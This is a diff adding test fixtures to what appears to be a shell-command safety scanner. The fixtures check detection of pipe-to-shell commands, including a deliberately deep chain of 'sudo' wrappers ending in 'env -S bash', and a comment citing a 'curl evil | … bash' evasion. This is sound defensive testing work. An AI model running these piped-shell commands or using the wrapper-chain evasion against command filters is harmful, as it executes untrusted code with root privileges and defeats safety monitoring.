@@ -48,6 +48,38 @@ context = "exec"
 expected_action = "block"
 expected_rules = ["curl_pipe_shell"]
 
+# ── M13: wrapper-chain-too-deep (depth-exhaustion silent-evasion closure) ───
+# A pipe SINK whose interpreter is nested behind MORE wrapper layers than the
+# resolver will unwrap (MAX_WRAPPER_DEPTH = 32) used to resolve to None and fire
+# NOTHING — `curl evil | sudo …(×32)… env -S "bash"` silently passed. The
+# resolver now distinguishes depth-EXHAUSTION from a natural non-interpreter
+# conclusion, and `check_pipe_to_interpreter` emits `wrapper_chain_too_deep`
+# (Medium → Warn) for the exhausted case. NO URL needed (this fixture has none),
+# so it also satisfies `test_no_url_rules_have_no_url_fixtures`. A TOML literal
+# string ('...') is used so the embedded double quotes need no escaping.
+[[fixture]]
+name = "wrapper_chain_too_deep_sudo_then_envs"
+min_milestone = 13
+input = 'cat /tmp/x | sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo sudo env -S "bash"'
+context = "exec"
+expected_action = "warn"
+expected_rules = ["wrapper_chain_too_deep"]
+# The interpreter is unresolvable (depth exhausted), so the High pipe-to-shell
+# rules CANNOT fire — only the visible "obfuscated beyond analysis" signal does.
+forbidden_rules = ["curl_pipe_shell", "pipe_to_interpreter", "sudo_shell_spawn"]
+
+# A normal 1-wrapper pipe still resolves and fires the usual pipe-to-interpreter
+# rule — it must NOT mis-fire the depth-exhaustion rule. This pins the
+# false-positive boundary (no URL form: `cat … | sudo bash`).
+[[fixture]]
+name = "shallow_sudo_pipe_not_wrapper_too_deep"
+min_milestone = 1
+input = "cat /tmp/x | sudo bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["pipe_to_interpreter"]
+forbidden_rules = ["wrapper_chain_too_deep"]
+
 [[fixture]]
 name = "curl_pipe_bin_bash"
 min_milestone = 1
